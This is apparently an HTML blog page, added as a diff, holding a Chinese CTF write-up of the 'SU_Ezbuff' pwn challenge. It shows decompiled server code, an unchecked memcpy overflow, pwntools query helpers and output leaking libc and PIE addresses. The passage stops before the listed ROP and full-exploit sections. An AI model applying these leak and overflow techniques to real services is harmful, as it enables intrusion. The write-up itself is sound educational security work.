@@ -1,0 +1,814 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  
+    
+      data-theme-mode="auto"
+    
+  >
+  <head>
+  
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_0khxww3tj3q9';window.REIMU_CONFIG.clipboard_tips = {"success":"澶嶅埗鎴愬姛(*^鈻絕*)","fail":"澶嶅埗澶辫触 (锞熲娍锞?锞?","copyright":{"enable":false,"count":100,"content":"鏈枃鐗堟潈锛氭湰鍗氬鎵€鏈夋枃绔犻櫎鐗瑰埆澹版槑澶栵紝鍧囬噰鐢?BY-NC-SA 璁稿彲鍗忚銆傝浆杞借娉ㄦ槑鍑哄锛?"}};window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'https://Khighl.github.io.git';</script>
+  
+  <title>
+    Ezbuff |
+    
+    Hexo
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+  
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_0khxww3tj3q9.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="SU_Ezbuff题目分析本题的附件包含pwn,libc.so.6和libevent-2.1.so.7.0.1 其中libevent-2.1.so.7.0.1包含了bufferevent相关的库函数 从pwn中可以看到main函数就是个请求分配器, 且开启了沙箱禁止命令执行 12345678910111213141516171819202122232425262728__int64 __fastc">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Ezbuff">
+<meta property="og:url" content="https://khighl.github.io.git/2026/03/25/SU_Ezbuff/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="SU_Ezbuff题目分析本题的附件包含pwn,libc.so.6和libevent-2.1.so.7.0.1 其中libevent-2.1.so.7.0.1包含了bufferevent相关的库函数 从pwn中可以看到main函数就是个请求分配器, 且开启了沙箱禁止命令执行 12345678910111213141516171819202122232425262728__int64 __fastc">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-03-24T16:00:00.000Z">
+<meta property="article:modified_time" content="2026-03-25T13:01:51.194Z">
+<meta property="article:author" content="zer00ne">
+<meta name="twitter:card" content="summary">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">灏戝コ绁堢シ涓?..</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+  
+</div>
+<header id="header">
+  
+    <picture></picture>
+    <img  fetchpriority="high" src="/images/lm.jpg" alt="Ezbuff">
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">Ezbuff</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        
+          <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SU-Ezbuff"><span class="toc-number">1.</span> <span class="toc-text">SU_Ezbuff</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">题目分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95"><span class="toc-number">1.2.</span> <span class="toc-text">调试</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%B0%E5%9D%80%E6%B3%84%E9%9C%B2"><span class="toc-number">1.2.1.</span> <span class="toc-text">地址泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fake-obj%E6%9E%84%E9%80%A0"><span class="toc-number">1.2.2.</span> <span class="toc-text">fake_obj构造</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#pwn%E5%88%86%E6%9E%90"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">pwn分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#libevent-2-1-so-7-0-1-so%E5%88%86%E6%9E%90"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">libevent-2.1.so.7.0.1.so分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sub-EE50%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">sub_EE50绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%94%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.2.4.</span> <span class="toc-text">锁绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="toc-number">1.3.</span> <span class="toc-text">栈迁移</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROP2shellcode"><span class="toc-number">1.4.</span> <span class="toc-text">ROP2shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4EXP"><span class="toc-number">1.5.</span> <span class="toc-text">完整EXP</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="zer00ne" class="lazyload">
+  <div class="sidebar-author-name">zer00ne</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">25</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">2</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+        
+      
+      
+        
+          <div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div>
+        
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+  
+</aside>
+
+          <section id="main"><article id="post-SU_Ezbuff" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link" data-aos="zoom-in">
+    <time datetime="2026-03-24T16:00:00.000Z" itemprop="datePublished">2026-03-25</time>
+    <time style="display: none;" id="post-update-time">2026-03-25</time>
+  </span>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/ctf/" data-aos="zoom-in">ctf</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="SU-Ezbuff"><a href="#SU-Ezbuff" class="headerlink" title="SU_Ezbuff"></a>SU_Ezbuff</h1><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>本题的附件包含<code>pwn</code>,<code>libc.so.6</code>和<code>libevent-2.1.so.7.0.1</code></p>
+<p>其中<code>libevent-2.1.so.7.0.1</code>包含了<code>bufferevent</code>相关的库函数</p>
+<p>从pwn中可以看到main函数就是个请求分配器, 且开启了沙箱禁止命令执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int fd; // [rsp+Ch] [rbp-44h]</span><br><span class="line">  struct sockaddr addr; // [rsp+20h] [rbp-30h] BYREF</span><br><span class="line">  __int64 n2; // [rsp+30h] [rbp-20h]</span><br><span class="line">  __int64 v7; // [rsp+38h] [rbp-18h]</span><br><span class="line">  unsigned __int64 v8; // [rsp+48h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(0x28u);</span><br><span class="line">  sandbox();                                    // 禁止execve和execvate</span><br><span class="line">  qword_40B0 = event_base_new(a1, (__int64)a2);</span><br><span class="line">  memset(&amp;s_, 0, 0x70uLL);</span><br><span class="line">  fd = socket(2, 2, 0);</span><br><span class="line">  *(_QWORD *)&amp;addr.sa_family = 2LL;</span><br><span class="line">  *(_QWORD *)&amp;addr.sa_data[6] = 0LL;</span><br><span class="line">  *(_WORD *)addr.sa_data = htons(8889u);</span><br><span class="line">  bind(fd, &amp;addr, 0x10u);</span><br><span class="line">  dword_4060 = 0;</span><br><span class="line">  ::fd = fd;</span><br><span class="line">  event_new(qword_40B0, fd, 18LL, (__int64)udp_ptr, (__int64)&amp;s_);</span><br><span class="line">  event_add();</span><br><span class="line">  n2 = 2LL;</span><br><span class="line">  v7 = 0LL;</span><br><span class="line">  WORD1(n2) = htons(0x22B8u);</span><br><span class="line">  evconnlistener_new_bind();</span><br><span class="line">  event_base_dispatch(qword_40B0);</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在<code>8888</code>端口为<code>tcp</code>连接, <code>8889</code>为<code>udp</code>连接</p>
+<p>tcp的处理函数和udp的处理函数如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall tcp_ptr(__int64 a1, __int64 dest)</span><br><span class="line">&#123;</span><br><span class="line">  int lenth; // edx</span><br><span class="line">  char src[1032]; // [rsp+20h] [rbp-410h] BYREF</span><br><span class="line">  unsigned __int64 v5; // [rsp+428h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  lenth = bufferevent_read(a1, src, 0x3FFuLL);</span><br><span class="line">  handle(dest, src, lenth, 0LL);              // unk_4078</span><br><span class="line">  return v5 - __readfsqword(0x28u);</span><br><span class="line">&#125;</span><br><span class="line">unsigned __int64 __fastcall udp_ptr(int fd, __int64 a2, __int64 dest)</span><br><span class="line">&#123;</span><br><span class="line">  socklen_t addr_len; // [rsp+10h] [rbp-430h] BYREF</span><br><span class="line">  int n; // [rsp+14h] [rbp-42Ch]</span><br><span class="line">  __int64 desta; // [rsp+18h] [rbp-428h]</span><br><span class="line">  sockaddr addr; // [rsp+20h] [rbp-420h] BYREF</span><br><span class="line">  _BYTE buf[1032]; // [rsp+30h] [rbp-410h] BYREF</span><br><span class="line">  unsigned __int64 v9; // [rsp+438h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v9 = __readfsqword(0x28u);</span><br><span class="line">  desta = dest;</span><br><span class="line">  addr_len = 16;</span><br><span class="line">  n = recvfrom(fd, buf, 0x3FFuLL, 0, &amp;addr, &amp;addr_len);</span><br><span class="line">  handle(desta, buf, n, &amp;addr);               // s</span><br><span class="line">  return v9 - __readfsqword(0x28u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以发现都是接收了字节流后将其传入<code>handle</code>中 : </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall handle(__int64 dest, _BYTE *src, int lenth, const struct sockaddr *addr)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v4; // rbx</span><br><span class="line">  __int64 v5; // rbx</span><br><span class="line">  __int64 v6; // rbx</span><br><span class="line">  __int64 v7; // rbx</span><br><span class="line">  _QWORD *buf; // [rsp+28h] [rbp-78h]</span><br><span class="line">  __int64 output; // [rsp+38h] [rbp-68h]</span><br><span class="line">  char name[8]; // [rsp+40h] [rbp-60h] BYREF</span><br><span class="line">  __int64 v14; // [rsp+48h] [rbp-58h]</span><br><span class="line">  __int64 v15; // [rsp+50h] [rbp-50h]</span><br><span class="line">  __int64 v16; // [rsp+58h] [rbp-48h]</span><br><span class="line">  __int64 v17; // [rsp+60h] [rbp-40h]</span><br><span class="line">  __int64 v18; // [rsp+68h] [rbp-38h]</span><br><span class="line">  __int64 v19; // [rsp+70h] [rbp-30h]</span><br><span class="line">  __int64 v20; // [rsp+78h] [rbp-28h]</span><br><span class="line">  unsigned __int64 v21; // [rsp+88h] [rbp-18h]</span><br><span class="line"></span><br><span class="line">  v21 = __readfsqword(0x28u);</span><br><span class="line">  if ( lenth &gt; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">    src[lenth] = 0;</span><br><span class="line">    buf = malloc(0x50uLL);</span><br><span class="line">    if ( buf )</span><br><span class="line">    &#123;</span><br><span class="line">      memset(buf, 0, 0x50uLL);</span><br><span class="line">      if ( inet_pton(2, src, (char *)buf + 4) )</span><br><span class="line">      &#123;</span><br><span class="line">        *(_WORD *)buf = 2;</span><br><span class="line">        gethostname(name, 0x40uLL);</span><br><span class="line">        v4 = v14;</span><br><span class="line">        buf[2] = *(_QWORD *)name;</span><br><span class="line">        buf[3] = v4;</span><br><span class="line">        v5 = v16;</span><br><span class="line">        buf[4] = v15;</span><br><span class="line">        buf[5] = v5;</span><br><span class="line">        v6 = v18;</span><br><span class="line">        buf[6] = v17;</span><br><span class="line">        buf[7] = v6;</span><br><span class="line">        v7 = v20;</span><br><span class="line">        buf[8] = v19;</span><br><span class="line">        buf[9] = v7;</span><br><span class="line">        memcpy((void *)dest, src, lenth);</span><br><span class="line">        if ( *(_DWORD *)(dest + 0x20) == 1 &amp;&amp; *(_QWORD *)(dest + 0x28) )</span><br><span class="line">        &#123;</span><br><span class="line">          output = bufferevent_get_output(*(_QWORD *)(dest + 0x28));// return *(_QWORD *)(a1 + 0x118);</span><br><span class="line">          evbuffer_add_reference(output, (__int64)buf, 80LL, (__int64)Free, 0LL);</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">          sendto(*(_DWORD *)(dest + 0x30), buf, 0x50uLL, 0, addr, 0x10u);</span><br><span class="line">          free(buf);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        free(buf);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return v21 - __readfsqword(0x28u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们一眼就可以看到一个很明显的漏洞 : memcpy完全没有检查字节串长度; 长度由recv函数接收到的字节数决定</p>
+<p>所以这里存在缓冲区溢出, 这里的dest通过交叉引用可以找到是两个<code>bss</code>上的变量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tcp-&gt;0x4078</span><br><span class="line">udp-&gt;0x4040</span><br></pre></td></tr></table></figure>
+
+<p>我们大致就可以写出一下的py交互函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">HOST = &quot;127.0.0.1&quot;</span><br><span class="line">TCP_PORT = 8888</span><br><span class="line">UDP_PORT = 8889</span><br><span class="line"></span><br><span class="line">def build_payload(ip_text: str, tail: bytes = b&quot;&quot;) -&gt; bytes:</span><br><span class="line">    return ip_text.encode() + b&quot;\x00&quot; + tail</span><br><span class="line"></span><br><span class="line">def recv_exact(io, n=0x50, timeout=1.0):</span><br><span class="line">    data = b&quot;&quot;</span><br><span class="line">    while len(data) &lt; n:</span><br><span class="line">        chunk = io.recv(n - len(data), timeout=timeout)</span><br><span class="line">        if not chunk:</span><br><span class="line">            break</span><br><span class="line">        data += chunk</span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line">def parse_reply(pkt: bytes):</span><br><span class="line">    if len(pkt) &lt; 0x50:</span><br><span class="line">        return &#123;&quot;ok&quot;: False, &quot;len&quot;: len(pkt), &quot;raw&quot;: pkt&#125;</span><br><span class="line">    family = u16(pkt[0:2])</span><br><span class="line">    ip_raw = pkt[4:8]</span><br><span class="line">    ip_text = socket.inet_ntoa(ip_raw)</span><br><span class="line">    hostname = pkt[0x10:0x50].split(b&quot;\x00&quot;, 1)[0].decode(errors=&quot;ignore&quot;)</span><br><span class="line">    return &#123;</span><br><span class="line">        &quot;ok&quot;: True,</span><br><span class="line">        &quot;family&quot;: family,</span><br><span class="line">        &quot;ip&quot;: ip_text,</span><br><span class="line">        &quot;hostname&quot;: hostname,</span><br><span class="line">        &quot;raw&quot;: pkt,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">def tcp_query(payload: bytes, host=HOST, port=TCP_PORT, timeout=1.0):</span><br><span class="line">    io = remote(host, port)</span><br><span class="line">    io.send(payload)</span><br><span class="line">    pkt = recv_exact(io, 0x50, timeout)</span><br><span class="line">    return io, pkt</span><br><span class="line"></span><br><span class="line">def udp_query(payload: bytes, host=HOST, port=UDP_PORT, timeout=1.0):</span><br><span class="line">    u = remote(host, port, typ=&quot;udp&quot;)</span><br><span class="line">    u.send(payload)</span><br><span class="line">    pkt = u.recv(timeout=timeout)</span><br><span class="line">    u.close()</span><br><span class="line">    return pkt</span><br></pre></td></tr></table></figure>
+
+<h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><h3 id="地址泄露"><a href="#地址泄露" class="headerlink" title="地址泄露"></a>地址泄露</h3><p>我们可以先随便打一发<code>tcp</code>和<code>udp</code>看看效果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">io, pkt = tcp_query(build_payload(&quot;1.1.1.1&quot;))</span><br><span class="line">print(&quot;[tcp]&quot;, parse_reply(pkt))</span><br><span class="line">pkt = udp_query(build_payload(&quot;8.8.8.8&quot;))</span><br><span class="line">print(&quot;[udp]&quot;, parse_reply(pkt))</span><br></pre></td></tr></table></figure>
+
+<hr>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[+] Opening connection to 127.0.0.1 on port 8888: Done</span><br><span class="line">[tcp] &#123;&#x27;ok&#x27;: True, &#x27;family&#x27;: 2, &#x27;ip&#x27;: &#x27;1.1.1.1&#x27;, &#x27;hostname&#x27;: &#x27;zer00ne-VMware-Virtual-Platform&#x27;, &#x27;raw&#x27;: b&#x27;\x02\x00\x00\x00\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00zer00ne-VMware-Virtual-Platform\x00\x08\x00\x00\x00\x00\x00\x00\x00\xff\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1a\x8b\xf7\xf7\xff\x7f\x00\x00&#x27;&#125;</span><br><span class="line">[+] Opening connection to 127.0.0.1 on port 8889: Done</span><br><span class="line">[*] Closed connection to 127.0.0.1 port 8889</span><br><span class="line">[udp] &#123;&#x27;ok&#x27;: True, &#x27;family&#x27;: 2, &#x27;ip&#x27;: &#x27;8.8.8.8&#x27;, &#x27;hostname&#x27;: &#x27;zer00ne-VMware-Virtual-Platform&#x27;, &#x27;raw&#x27;: b&#x27;\x02\x00\x00\x00\x08\x08\x08\x08\x00\x00\x00\x00\x00\x00\x00\x00zer00ne-VMware-Virtual-Platform\x00p\xddUUUU\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\xda\xff\xff\xff\x7f\x00\x00\x19VUUUU\x00\x00&#x27;&#125;</span><br><span class="line">[*] Paused (press any to continue)</span><br></pre></td></tr></table></figure>
+
+<p>可以看到得到的字节流中出现了很多比较敏感的数据</p>
+<p>大致可以发现包含libc地址<code>\x1a\x8b\xf7\xf7\xff\x7f</code> ; pie偏移<code>\x19VUUUU</code></p>
+<p>我们可以接收这两个地址, 计算出<code>pwn</code> 的基地址, <code>libc.so.6</code>的基地址和<code>libevent-2.1.so.7.0.1</code></p>
+<p>我们通过gdb调试, 使用<code>search -p &lt;ptr&gt;</code>可以找到这几个地址是从哪里得到的</p>
